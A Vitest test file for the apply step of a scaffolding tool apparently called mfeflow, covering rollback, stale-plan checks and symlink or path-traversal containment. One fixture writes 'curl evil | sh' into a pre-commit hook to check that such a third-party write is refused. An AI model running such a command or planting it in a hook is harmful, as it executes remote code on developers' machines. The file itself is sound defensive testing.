import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { applyPlan } from './apply';
import { realFs, type FsOps } from './fs';
import { hashContent } from './hash';
import { emptyPlan, type FileChange, type Plan } from './plan';
import { loadProject, saveProject, type MfeflowProject } from './project';
import { rejection } from './testing';

const project: MfeflowProject = {
  version: 1,
  topology: 'monorepo',
  packageManager: 'pnpm',
  scope: '@shopco',
  apps: { shell: { kind: 'shell', path: 'apps/shell' } },
  features: {},
};

let root: string;
beforeEach(async () => {
  root = await fs.mkdtemp(path.join(os.tmpdir(), 'mfeflow-apply-'));
});
afterEach(async () => {
  await fs.rm(root, { recursive: true, force: true });
});

const at = (file: string) => path.join(root, file);
const read = (file: string) => fs.readFile(at(file), 'utf8');
const exists = (file: string) =>
  fs.access(at(file)).then(
    () => true,
    () => false,
  );

const create = (file: string, after: string, track = true): FileChange => ({
  path: file,
  action: 'create',
  before: null,
  after,
  track,
  trust: 'first-party',
});
const patch = (file: string, before: string, after: string): FileChange => ({
  path: file,
  action: 'patch',
  before,
  after,
  track: false,
  trust: 'first-party',
});
const remove = (file: string, before: string): FileChange => ({
  path: file,
  action: 'delete',
  before,
  after: null,
  track: false,
  trust: 'first-party',
});
const thirdParty = (change: FileChange): FileChange => ({ ...change, trust: 'third-party' });
const planOf = (...changes: FileChange[]): Plan => ({ ...emptyPlan(), changes });
/** A plan made while mfeflow.json held `projectBefore` (null: it did not exist). */
const planWithProject = (projectBefore: string | null, ...changes: FileChange[]): Plan => ({
  ...planOf(...changes),
  projectBefore,
});

async function leftovers(): Promise<string[]> {
  const entries = await fs.readdir(root, { recursive: true });
  return entries.filter((e) => e.endsWith('.tmp'));
}

/** An install step that makes `changes` and then fails. */
const fails = (changes: () => Promise<void>) => async () => {
  await changes();
  throw new Error('ERR_PNPM_FETCH_404');
};

describe('applyPlan', () => {
  it('creates, patches and deletes', async () => {
    await fs.writeFile(at('edit.txt'), 'one\n');
    await fs.writeFile(at('gone.txt'), 'bye\n');
    const result = await applyPlan(
      planOf(
        create('apps/shell/src/new.ts', 'new\n'),
        patch('edit.txt', 'one\n', 'one\ntwo\n'),
        remove('gone.txt', 'bye\n'),
      ),
      { root },
    );
    expect(await read('apps/shell/src/new.ts')).toBe('new\n');
    expect(await read('edit.txt')).toBe('one\ntwo\n');
    expect(await exists('gone.txt')).toBe(false);
    expect(result.written).toEqual(['apps/shell/src/new.ts', 'edit.txt', 'gone.txt']);
    expect(await leftovers()).toEqual([]);
  });

  it('accepts a target that only differs in line endings', async () => {
    await fs.writeFile(at('a.txt'), 'one\r\ntwo\r\n');
    await applyPlan(planOf(patch('a.txt', 'one\ntwo\n', 'one\ntwo\nthree\n')), { root });
    expect(await read('a.txt')).toBe('one\ntwo\nthree\n');
  });

  it('writes nothing in a dry run, but still checks the targets', async () => {
    await applyPlan(planOf(create('a.txt', 'a')), { root, dryRun: true });
    expect(await exists('a.txt')).toBe(false);
    await fs.writeFile(at('b.txt'), 'changed');
    const error = await rejection(
      applyPlan(planOf(patch('b.txt', 'old', 'new')), { root, dryRun: true }),
    );
    expect(error.code).toBe('MFEFLOW_E211');
  });

  it('refuses when a patched file changed since the plan, and writes nothing (E211)', async () => {
    await fs.writeFile(at('edit.txt'), 'user edit\n');
    const error = await rejection(
      applyPlan(planOf(create('first.txt', 'x'), patch('edit.txt', 'one\n', 'one\ntwo\n')), {
        root,
      }),
    );
    expect(error.code).toBe('MFEFLOW_E211');
    expect(error.message).toContain('edit.txt');
    expect(await exists('first.txt')).toBe(false);
    expect(await read('edit.txt')).toBe('user edit\n');
  });

  it('refuses when a file to create now exists, or a file to patch or delete vanished', async () => {
    await fs.writeFile(at('a.txt'), 'there');
    await expect(applyPlan(planOf(create('a.txt', 'x')), { root })).rejects.toMatchObject({
      code: 'MFEFLOW_E211',
    });
    await expect(applyPlan(planOf(patch('nope.txt', 'a', 'b')), { root })).rejects.toMatchObject({
      code: 'MFEFLOW_E211',
    });
    await expect(applyPlan(planOf(remove('nope.txt', 'a')), { root })).rejects.toMatchObject({
      code: 'MFEFLOW_E211',
    });
  });

  it('refuses a path that leaves the project (E105)', async () => {
    await expect(applyPlan(planOf(create('../evil.txt', 'x')), { root })).rejects.toMatchObject({
      code: 'MFEFLOW_E105',
    });
  });

  it('rolls back when a create cannot be written (parent is a file)', async () => {
    await fs.writeFile(at('blocker'), 'i am a file');
    await fs.writeFile(at('edit.txt'), 'one\n');
    await expect(
      applyPlan(
        planOf(
          create('fresh/dir/a.txt', 'a'),
          patch('edit.txt', 'one\n', 'two\n'),
          create('blocker/child.txt', 'b'),
        ),
        { root },
      ),
    ).rejects.toMatchObject({ code: 'MFEFLOW_E212' });
    expect(await exists('fresh')).toBe(false);
    expect(await read('edit.txt')).toBe('one\n');
    expect(await read('blocker')).toBe('i am a file');
    expect(await leftovers()).toEqual([]);
  });

  it('rolls back everything already renamed when a later rename fails', async () => {
    await fs.writeFile(at('edit.txt'), 'one\n');
    await fs.writeFile(at('gone.txt'), 'bye\n');
    let renames = 0;
    const failing: FsOps = {
      ...realFs,
      rename: (from, to) => {
        renames += 1;
        return renames === 3 ? Promise.reject(new Error('disk full')) : realFs.rename(from, to);
      },
    };
    const error = await rejection(
      applyPlan(
        planOf(
          create('new/a.txt', 'a'),
          patch('edit.txt', 'one\n', 'two\n'),
          remove('gone.txt', 'bye\n'),
          create('b.txt', 'b'),
        ),
        { root, fs: failing },
      ),
    );
    expect(error.code).toBe('MFEFLOW_E212');
    expect(error.message).toContain('disk full');
    expect(renames).toBeGreaterThanOrEqual(3);
    expect(await exists('new')).toBe(false);
    expect(await read('edit.txt')).toBe('one\n');
    expect(await read('gone.txt')).toBe('bye\n');
    expect(await exists('b.txt')).toBe(false);
    expect(await leftovers()).toEqual([]);
  });

  it('says which files it could not restore if the rollback itself fails', async () => {
    await fs.writeFile(at('edit.txt'), 'one\n');
    let renames = 0;
    const failing: FsOps = {
      ...realFs,
      rename: (from, to) => {
        renames += 1;
        if (renames === 2) return Promise.reject(new Error('boom'));
        return to === at('edit.txt') && renames > 2
          ? Promise.reject(new Error('read-only'))
          : realFs.rename(from, to);
      },
    };
    const error = await rejection(
      applyPlan(planOf(patch('edit.txt', 'one\n', 'two\n'), create('b.txt', 'b')), {
        root,
        fs: failing,
      }),
    );
    expect(error.message).toContain('could not restore');
    expect(error.message).toContain(at('edit.txt'));
    expect(await leftovers()).toEqual([]);
  });

  describe('containment', () => {
    let outside: string;
    beforeEach(async () => {
      outside = await fs.mkdtemp(path.join(os.tmpdir(), 'mfeflow-outside-'));
    });
    afterEach(async () => {
      await fs.rm(outside, { recursive: true, force: true });
    });

    it('refuses to write through a symlinked folder that leaves the project (E105)', async () => {
      await fs.symlink(outside, at('src'));
      const error = await rejection(applyPlan(planOf(create('src/new/a.ts', 'x')), { root }));
      expect(error.code).toBe('MFEFLOW_E105');
      expect(error.message).toContain('symlink');
      expect(await fs.readdir(outside)).toEqual([]);
    });

    it('refuses a symlinked file that points outside, also in a dry run', async () => {
      await fs.writeFile(path.join(outside, 'secret'), 'secret');
      await fs.symlink(path.join(outside, 'secret'), at('a.txt'));
      const errors = await Promise.all(
        [true, false].map((dryRun) =>
          rejection(applyPlan(planOf(patch('a.txt', 'secret', 'changed')), { root, dryRun })),
        ),
      );
      expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E105', 'MFEFLOW_E105']);
      expect(await fs.readFile(path.join(outside, 'secret'), 'utf8')).toBe('secret');
    });

    describe('third-party changes', () => {
      it('refuse to write through a symlinked folder that stays inside the project', async () => {
        await fs.mkdir(at('.husky'));
        await fs.mkdir(at('apps/shell/src'), { recursive: true });
        await fs.symlink('../../../.husky', at('apps/shell/src/hooks'));
        const plan = planOf(
          thirdParty(create('apps/shell/src/hooks/pre-commit', 'curl evil | sh')),
        );
        const errors = await Promise.all(
          [true, false].map((dryRun) => rejection(applyPlan(plan, { root, dryRun }))),
        );
        expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E203', 'MFEFLOW_E203']);
        expect(errors[0]?.message).toContain('apps/shell/src/hooks');
        expect(await fs.readdir(at('.husky'))).toEqual([]);
      });

      it('refuse a symlink to the project root, which re-roots src/', async () => {
        await fs.mkdir(at('apps/shell/src'), { recursive: true });
        await fs.symlink('..', at('apps/shell/src/app'));
        const plan = planOf(thirdParty(create('apps/shell/src/app/package.json', '{}')));
        await expect(applyPlan(plan, { root })).rejects.toMatchObject({ code: 'MFEFLOW_E203' });
        expect(await exists('apps/shell/package.json')).toBe(false);
      });

      it('refuse an existing target that is itself a symlink', async () => {
        await fs.writeFile(at('real.ts'), 'one');
        await fs.symlink('real.ts', at('link.ts'));
        await expect(
          applyPlan(planOf(thirdParty(patch('link.ts', 'one', 'two'))), { root }),
        ).rejects.toMatchObject({ code: 'MFEFLOW_E203' });
        expect(await read('real.ts')).toBe('one');
      });

      it('write normally when no part of the path is a link, and first-party keeps following in-project links', async () => {
        await fs.mkdir(at('real'));
        await fs.symlink(at('real'), at('alias'));
        await applyPlan(planOf(thirdParty(create('plain/a.ts', 'x'))), { root });
        expect(await read('plain/a.ts')).toBe('x');
        await applyPlan(planOf(create('alias/b.ts', 'y')), { root });
        expect(await read('real/b.ts')).toBe('y');
      });
    });

    describe('with refuseSymlinks', () => {
      it('refuses a symlinked package.json, in a dry run too, and leaves its target alone', async () => {
        await fs.mkdir(at('real'));
        await fs.writeFile(at('real/package.json'), '{"a":1}');
        await fs.symlink('real/package.json', at('package.json'));
        const plan = planOf(patch('package.json', '{"a":1}', '{"a":2}'));
        const errors = await Promise.all(
          [true, false].map((dryRun) =>
            rejection(applyPlan(plan, { root, dryRun, refuseSymlinks: true })),
          ),
        );
        expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E105', 'MFEFLOW_E105']);
        expect(await read('real/package.json')).toBe('{"a":1}');
      });

      it('refuses a create under a symlinked folder even when the file does not exist yet', async () => {
        await fs.mkdir(at('real'));
        await fs.symlink(at('real'), at('alias'));
        await expect(
          applyPlan(planOf(create('alias/new.ts', 'x')), { root, refuseSymlinks: true }),
        ).rejects.toMatchObject({ code: 'MFEFLOW_E105' });
        expect(await exists('real/new.ts')).toBe(false);
      });

      it('catches a link put in place after the plan was made', async () => {
        await fs.mkdir(at('src'));
        await fs.mkdir(at('elsewhere'));
        const plan = planOf(create('src/a.ts', 'x'));
        await fs.rm(at('src'), { recursive: true });
        await fs.symlink(at('elsewhere'), at('src'));
        await expect(applyPlan(plan, { root, refuseSymlinks: true })).rejects.toMatchObject({
          code: 'MFEFLOW_E105',
        });
        expect(await fs.readdir(at('elsewhere'))).toEqual([]);
      });

      it('writes normally when no part of the path is a link', async () => {
        await applyPlan(planOf(create('plain/a.ts', 'x')), { root, refuseSymlinks: true });
        expect(await read('plain/a.ts')).toBe('x');
      });
    });

    it('checks every target before writing the first one', async () => {
      await fs.symlink(outside, at('link'));
      await expect(
        applyPlan(planOf(create('first.txt', 'x'), create('link/second.txt', 'y')), { root }),
      ).rejects.toMatchObject({ code: 'MFEFLOW_E105' });
      expect(await exists('first.txt')).toBe(false);
    });

    it('allows symlinks that stay inside the project, and a symlinked root', async () => {
      await fs.mkdir(at('real'));
      await fs.symlink(at('real'), at('alias'));
      await applyPlan(planOf(create('alias/a.txt', 'x')), { root });
      expect(await read('real/a.txt')).toBe('x');
      const rootLink = path.join(outside, 'root-link');
      await fs.symlink(root, rootLink);
      await applyPlan(planOf(create('b.txt', 'y')), { root: rootLink });
      expect(await read('b.txt')).toBe('y');
    });

    it('rolls back by replacing files, never by writing through a link made meanwhile', async () => {
      await fs.writeFile(at('edit.txt'), 'one\n');
      const secret = path.join(outside, 'secret');
      await fs.writeFile(secret, 'secret');
      const error = await rejection(
        applyPlan(planOf(patch('edit.txt', 'one\n', 'two\n')), {
          root,
          install: async () => {
            await fs.rm(at('edit.txt'));
            await fs.symlink(secret, at('edit.txt'));
            throw new Error('install failed');
          },
        }),
      );
      expect(error.code).toBe('MFEFLOW_E213');
      expect(await fs.readFile(secret, 'utf8')).toBe('secret');
      expect(await read('edit.txt')).toBe('one\n');
      expect((await fs.lstat(at('edit.txt'))).isSymbolicLink()).toBe(false);
    });

    it('leaves a hard link to a patched file untouched, through apply and rollback', async () => {
      await fs.writeFile(at('edit.txt'), 'one\n');
      await fs.link(at('edit.txt'), path.join(outside, 'twin.txt'));
      await rejection(
        applyPlan(planOf(patch('edit.txt', 'one\n', 'two\n')), {
          root,
          install: () => Promise.reject(new Error('install failed')),
        }),
      );
      expect(await fs.readFile(path.join(outside, 'twin.txt'), 'utf8')).toBe('one\n');
      expect(await read('edit.txt')).toBe('one\n');
    });
  });

  describe('install step', () => {
    it('runs after the files are written, with the root and plan', async () => {
      const seen: string[] = [];
      const plan = planOf(create('a.txt', 'a'));
      await applyPlan(plan, {
        root,
        install: async (ctx) => {
          seen.push(await fs.readFile(path.join(ctx.root, 'a.txt'), 'utf8'));
          expect(ctx.plan).toBe(plan);
        },
      });
      expect(seen).toEqual(['a']);
    });

    it('does not run in a dry run or when the plan is stale', async () => {
      const install = vi.fn(() => Promise.resolve());
      await applyPlan(planOf(create('a.txt', 'a')), { root, install, dryRun: true });
      await fs.writeFile(at('b.txt'), 'x');
      await rejection(applyPlan(planOf(create('b.txt', 'b')), { root, install }));
      expect(install).not.toHaveBeenCalled();
    });

    it('rolls everything back when it fails (E213), including mfeflow.json', async () => {
      await saveProject(root, project);
      const before = await read('mfeflow.json');
      await fs.writeFile(at('edit.txt'), 'one\n');
      const error = await rejection(
        applyPlan(
          {
            ...planWithProject(before, create('a.txt', 'a'), patch('edit.txt', 'one\n', 'two\n')),
            features: [{ name: 'tsconfig', version: '1.0.0' }],
          },
          { root, project, install: () => Promise.reject(new Error('ENOTFOUND registry')) },
        ),
      );
      expect(error.code).toBe('MFEFLOW_E213');
      expect(error.message).toContain('ENOTFOUND');
      expect(await exists('a.txt')).toBe(false);
      expect(await read('edit.txt')).toBe('one\n');
      expect(await read('mfeflow.json')).toBe(before);
    });
  });

  describe('install step changes', () => {
    it('restores the lockfiles, package.json and workspace file the install touched, and names them', async () => {
      await fs.writeFile(at('pnpm-lock.yaml'), 'lock v1\n');
      await fs.writeFile(at('package.json'), '{"name":"root"}\n');
      await fs.writeFile(at('pnpm-workspace.yaml'), 'packages: []\n');
      await fs.writeFile(at('yarn.lock'), 'yarn lock\n');
      await fs.writeFile(at('package-lock.json'), 'untouched\n');
      await fs.writeFile(at('edit.txt'), 'one\n');
      const error = await rejection(
        applyPlan(
          planWithProject(
            null,
            create('apps/shell/src/a.ts', 'a'),
            patch('edit.txt', 'one\n', 'two\n'),
          ),
          {
            root,
            project: { ...project, packageManager: 'pnpm' },
            install: fails(async () => {
              await fs.writeFile(at('pnpm-lock.yaml'), 'lock v2 with new packages\n');
              await fs.writeFile(at('package.json'), '{"name":"root","dependencies":{}}\n');
              await fs.writeFile(at('pnpm-workspace.yaml'), 'packages: [x]\n');
              await fs.rm(at('yarn.lock'));
              await fs.writeFile(at('npm-shrinkwrap.json'), '{}');
            }),
          },
        ),
      );
      expect(error.code).toBe('MFEFLOW_E213');
      expect(await read('pnpm-lock.yaml')).toBe('lock v1\n');
      expect(await read('package.json')).toBe('{"name":"root"}\n');
      expect(await read('pnpm-workspace.yaml')).toBe('packages: []\n');
      expect(await read('yarn.lock')).toBe('yarn lock\n');
      expect(await read('package-lock.json')).toBe('untouched\n');
      expect(await exists('npm-shrinkwrap.json')).toBe(false);
      expect(await exists('apps/shell/src/a.ts')).toBe(false);
      expect(await exists('mfeflow.json')).toBe(false);
      expect(await read('edit.txt')).toBe('one\n');
      expect(error.message).toContain('ERR_PNPM_FETCH_404');
      expect(error.message).toContain('restored the 3 files the plan wrote');
      expect(error.message).toContain(
        'restored what the install changed: npm-shrinkwrap.json, package.json, pnpm-lock.yaml, pnpm-workspace.yaml, yarn.lock',
      );
      expect(error.message).not.toContain('package-lock.json');
      expect(error.message).toContain('node_modules was not rolled back');
      expect(error.message).toContain('pnpm install');
      expect(await leftovers()).toEqual([]);
    });

    it('also covers the lockfiles beside every package.json the plan patches', async () => {
      await fs.mkdir(at('apps/shell'), { recursive: true });
      await fs.writeFile(at('apps/shell/package.json'), '{}\n');
      await fs.writeFile(at('apps/shell/package-lock.json'), 'lock v1\n');
      const error = await rejection(
        applyPlan(planOf(patch('apps/shell/package.json', '{}\n', '{"a":1}\n')), {
          root,
          install: fails(async () => {
            await fs.writeFile(at('apps/shell/package-lock.json'), 'lock v2\n');
          }),
        }),
      );
      expect(await read('apps/shell/package-lock.json')).toBe('lock v1\n');
      expect(await read('apps/shell/package.json')).toBe('{}\n');
      expect(error.message).toContain('apps/shell/package-lock.json');
      expect(error.message).toContain('your package manager install');
    });

    it('says when the install changed nothing else', async () => {
      const error = await rejection(
        applyPlan(planOf(create('a.txt', 'a')), { root, install: fails(async () => {}) }),
      );
      expect(error.message).toContain('the install changed no tracked file');
    });

    it('keeps what the install wrote when it succeeds', async () => {
      await fs.writeFile(at('pnpm-lock.yaml'), 'lock v1\n');
      await applyPlan(planOf(create('a.txt', 'a')), {
        root,
        install: () => fs.writeFile(at('pnpm-lock.yaml'), 'lock v2\n'),
      });
      expect(await read('pnpm-lock.yaml')).toBe('lock v2\n');
    });
  });

  describe('mfeflow.json', () => {
    it('records the feature and file hashes in the same transaction', async () => {
      await saveProject(root, project);
      const result = await applyPlan(
        {
          ...planWithProject(
            await read('mfeflow.json'),
            create('apps/shell/src/consent.ts', 'consent\n'),
          ),
          features: [{ name: 'analytics-gtm', version: '0.3.0', options: { consent: 'denied' } }],
        },
        { root, project },
      );
      const saved = await loadProject(root);
      expect(saved.features['analytics-gtm']).toEqual({
        version: '0.3.0',
        options: { consent: 'denied' },
      });
      expect(saved.files).toEqual({ 'apps/shell/src/consent.ts': hashContent('consent\n') });
      expect(saved).toMatchObject(result.project ?? {});
      expect(result.written).toContain('mfeflow.json');
    });

    it('creates mfeflow.json for a new project', async () => {
      await applyPlan(planWithProject(null, create('a.txt', 'a')), { root, project });
      expect((await loadProject(root)).scope).toBe('@shopco');
    });

    it('refuses when mfeflow.json changed since the plan, and keeps the edit (E211)', async () => {
      await saveProject(root, project);
      const planned = await read('mfeflow.json');
      const edited = `${planned.trimEnd().slice(0, -1)},\n  "registries": { "@acme": "https://acme.example/{name}.json" }\n}\n`;
      await fs.writeFile(at('mfeflow.json'), edited);
      const plan = {
        ...planWithProject(planned, create('a.txt', 'a')),
        features: [{ name: 'tsconfig', version: '1.0.0' }],
      };
      const error = await rejection(applyPlan(plan, { root, project }));
      expect(error.code).toBe('MFEFLOW_E211');
      expect(error.message).toContain('mfeflow.json');
      expect(await read('mfeflow.json')).toBe(edited);
      expect(await exists('a.txt')).toBe(false);
    });

    it('refuses when mfeflow.json appeared after a plan made without one', async () => {
      await saveProject(root, project);
      const error = await rejection(
        applyPlan(planWithProject(null, create('a.txt', 'a')), { root, project }),
      );
      expect(error.code).toBe('MFEFLOW_E211');
    });

    it('refuses a plan that never recorded mfeflow.json instead of reading it now', async () => {
      await saveProject(root, project);
      const error = await rejection(applyPlan(planOf(create('a.txt', 'a')), { root, project }));
      expect(error.code).toBe('MFEFLOW_E211');
      expect(error.message).toContain('plan again');
      expect(await exists('a.txt')).toBe(false);
    });

    it('does not rewrite mfeflow.json when nothing changes in it', async () => {
      await saveProject(root, project);
      const result = await applyPlan(
        planWithProject(await read('mfeflow.json'), create('a.txt', 'a', false)),
        { root, project },
      );
      expect(result.written).toEqual(['a.txt']);
    });
  });
});
